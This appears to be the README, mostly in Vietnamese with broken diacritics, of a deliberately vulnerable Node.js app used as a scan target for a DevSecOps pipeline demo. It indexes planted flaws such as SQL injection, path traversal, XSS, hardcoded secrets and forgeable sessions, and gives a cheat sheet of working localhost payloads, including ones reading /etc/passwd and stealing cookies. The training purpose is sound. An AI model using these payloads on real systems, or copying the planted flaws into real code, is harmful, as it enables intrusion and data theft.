# vulnerable-app

> **?? C?NH BÁO: ?ng d?ng này du?c t?o ra C? Ý có l?i b?o m?t.**
> **KHÔNG deploy lên production, staging, hay b?t k? môi tru?ng internet-facing nào.**

---

## M?c dích

`vulnerable-app` là m?t ?ng d?ng Node.js + Express du?c thi?t k? d?c bi?t d? làm **scan target** cho **DevSecOps pipeline demo**. Nó ch?a các l? h?ng b?o m?t th?c t?, du?c d?t dúng v? trí d? các công c? SAST, SCA, IaC, và DAST có th? phát hi?n.

D? án này thu?c h? sinh thái **AppSec Pipeline Demo** c?a nhóm b?o m?t ?ng d?ng.

---

## C?u trúc thu m?c

```
vulnerable-app/
+-- app.js                   ? Entry point (verbose error handler)
+-- package.json             ? Pinned vulnerable dependencies
+-- Dockerfile               ? Misconfigured container image
+-- src/
¦   +-- routes/
¦   ¦   +-- user.js          ? SQL Injection + IDOR
¦   ¦   +-- file.js          ? Path Traversal
¦   ¦   +-- auth.js          ? Reflected XSS + Broken Auth
¦   +-- config/
¦       +-- db.js            ? Hardcoded secrets
+-- README.md
```

---

## Danh sách l? h?ng (Vulnerability Index)

| ID | Lo?i | File | Dòng | CWE | OWASP 2021 | Severity | CVSS v3 |
|----|------|------|------|-----|-----------|----------|---------|
| VULN-001 | SQL Injection | `src/routes/user.js` | 42, 68, 94 | CWE-89 | A03 – Injection | **CRITICAL** | 9.8 |
| VULN-002 | IDOR | `src/routes/user.js` | 55, 75 | CWE-284 | A01 – Broken Access Control | HIGH | 7.5 |
| VULN-003 | Path Traversal | `src/routes/file.js` | 67, 90, 115 | CWE-22 | A01 – Broken Access Control | HIGH | 7.3 |
| VULN-004 | Reflected XSS | `src/routes/auth.js` | 57-71 | CWE-79 | A03 – Injection | HIGH | 6.1 |
| VULN-005 | Hardcoded Secret | `src/config/db.js` | 8-11 | CWE-798 | A07 – Auth Failures | HIGH | 7.5 |
| VULN-006 | Root Container | `Dockerfile` | 18 | CWE-250 | A05 – Misconfiguration | **CRITICAL** | 8.8 |
| VULN-007 | Verbose Error | `app.js` | 55-57 | CWE-209 | A05 – Misconfiguration | LOW | 3.7 |
| VULN-008 | Broken Auth | `src/routes/auth.js` | 98-130 | CWE-287 | A07 – Auth Failures | HIGH | 8.1 |
| VULN-009 | No HEALTHCHECK | `Dockerfile` | – | CWE-778 | A05 – Misconfiguration | MEDIUM | 4.3 |
| VULN-010 | Exposed SSH Port | `Dockerfile` | 32 | CWE-284 | A05 – Misconfiguration | MEDIUM | 5.3 |

### Vulnerable Dependencies (SCA)

| Package | Version | CVE | CVSS | Severity |
|---------|---------|-----|------|----------|
| `lodash` | 4.17.20 | CVE-2021-23337 | 7.2 | HIGH |
| `axios` | 0.21.1 | CVE-2022-0155 | 6.5 | HIGH |

---

## Exploit Cheat Sheet (Demo Only)

```bash
# [VULN-001] SQL Injection – Auth Bypass
curl -X POST http://localhost:53000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\''--", "password": "anything"}'

# [VULN-001] SQL Injection – Data Dump
curl "http://localhost:53000/api/user/1%20OR%201%3D1"

# [VULN-003] Path Traversal – Read /etc/passwd
curl "http://localhost:53000/api/download?filename=../../../../../../etc/passwd"

# [VULN-003] Path Traversal – Steal secrets from config
curl "http://localhost:53000/api/download?filename=../../src/config/db.js"

# [VULN-004] Reflected XSS
open "http://localhost:53000/api/search?q=<script>alert(document.cookie)</script>"

# [VULN-008] Session Forge – Elevate to admin
curl -b "session=$(echo -n '1:admin' | base64)" http://localhost:53000/api/profile
```

---

## Ch?y ?ng d?ng (demo environment only)

```bash
# Cài dependencies
npm install

# Ch?y ?ng d?ng
npm start
# ho?c
node app.js

# Server starts at: http://localhost:53000
```

### Ch?y b?ng Docker (demo only)

```bash
# Build image
docker build -t vulnerable-app:demo .

# Run container
docker run -p 53000:53000 vulnerable-app:demo
```

---

## Công c? scan du?c configure trong pipeline

| Tool | Lo?i scan | File k?t qu? |
|------|-----------|-------------|
| **Semgrep 1.68** | SAST | `mock-data/sast_results.json` |
| **Trivy 0.50** | SCA | `mock-data/sca_results.json` |
| **Checkov 3.2** | IaC | `mock-data/iac_results.json` |
| **OWASP ZAP 2.14** | DAST | `mock-data/dast_results.json` |

K?t qu? t?ng h?p: `mock-data/full_report.json`

---

## Ngu?i t?o & m?c dích s? d?ng

- **T?o b?i**: AppSec Team – CMC Technology & Solution
- **M?c dích**: DevSecOps pipeline demo & training
- **Môi tru?ng du?c phép**: `localhost` / isolated lab network ONLY
- **Nghiêm c?m**: Deploy lên internet, staging, ho?c production

---

> *"The best way to understand how to defend systems is to understand how they are attacked."*
